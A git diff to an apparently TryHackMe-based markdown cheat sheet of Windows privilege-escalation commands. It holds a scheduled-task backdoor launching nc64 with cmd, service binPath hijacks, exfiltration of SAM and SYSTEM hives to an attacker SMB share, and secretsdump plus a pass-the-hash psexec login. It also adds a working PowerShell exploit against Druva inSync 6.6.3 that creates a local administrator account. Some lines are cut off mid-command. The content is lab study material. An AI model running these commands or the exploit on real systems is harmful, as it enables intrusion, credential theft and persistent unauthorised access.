@@ -374,6 +374,8 @@ schtasks delete
 schtasks end
 schtasks query
 schtasks run
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cm$
+schtasks /query /tn thm-taskbackdoor
 ```
 
 ## Controlling a Service Using SC
@@ -384,13 +386,14 @@ https://learn.microsoft.com/en-us/windows-server/administration/windows-commands
 
 ```
 sc query
-sc query type=service
-SC query type=service | FIND "SERVICE_NAME"
+sc query type= service
+SC query type= service | FIND "SERVICE_NAME"
 sc query THMService
 icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
-sc config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 sc stop THMService
 sc start THMService
+sc config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "$
 ```
 
 ## whoami
@@ -412,7 +415,7 @@ Because of the sensitivity of the data that is stored in this database, SYSTEM p
 Start a share on the attacker machine
 ```
 mkdir share
-python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public share
 ```
 
 Access it from the windows machine
@@ -430,7 +433,7 @@ reg save hklm\sam \\10.10.7.8\public\sam.hive
 
 On the attacker machine
 ```
-python3.9 /opt/impacket/examples/secretsdump.py -sam share/sam.hive -system share/system.hive LOCAL
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.136.180
 ```
 
@@ -441,4 +444,60 @@ Run in cmd.exe as administrator
 takeown /f C:\Windows\System32\Utilman.exe
 icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
 C:\Windows\System32\> copy cmd.exe utilman.exe
+```
+
+## WES-NG: Windows Exploit Suggester - Next Generation
+
+WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.
+
+At the BITSADMIN blog an in-depth article on WES-NG is available: Windows Security Updates for Hackers.
+
+https://github.com/bitsadmin/wesng
+
+On the windows machine
+
+```
+systeminfo > sysinfo.txt
+```
+
+```
+git clone https://github.com/bitsadmin/wesng.git
+cd wesng
+python3 wes.py --update
+python3 wes.py ../share/sysinfo.txt
+```
+
+## The WMI command-line (WMIC)
+
+The WMI command-line (WMIC) utility provides a command-line interface for Windows Management Instrumentation (WMI). WMIC is compatible with existing shells and utility commands. The following is a general reference topic for WMIC. For more information and guidelines on how to use WMIC, including additional information on aliases, verbs, switches, and commands, see Using Windows Management Instrumentation command-line and WMIC—take command-line control over WMI.
+
+```
+wmic product get name,version,vendor
+```
+
+## Druva 6.6.3
+
+In powershell:
+```
+$ErrorActionPreference = "Stop"
+$cmd = "net user pwnd passwd123 /add & net localgroup administrators pwnd /add"
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+Then check status of created user:
+```
+net user pwnd
 ```
